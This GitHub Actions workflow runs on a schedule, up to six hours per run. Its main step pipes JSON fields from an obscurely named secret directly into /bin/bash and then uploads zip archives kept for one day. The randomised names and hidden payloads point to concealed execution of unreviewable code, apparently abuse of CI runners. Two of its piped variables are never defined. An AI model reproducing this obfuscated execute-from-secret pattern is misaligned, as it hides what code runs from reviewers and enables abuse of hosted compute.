name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '42 0,6,12,18 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  service:
    name: Run task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Run
        env:
          btzx59: ${{ secrets.btzx59 }}
        run: |
          printf '%s' "$btzx59" | jq -r .mtae6279 | /bin/bash
          printf '%s' "$beu84" | jq -r .qamus20295 | /bin/bash
          echo $zfcfu96 | jq -r .tkyjr23952 | /bin/bash

      - name: Save archive
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: mSNeRo2u
          path: "*.zip"
          retention-days: 1
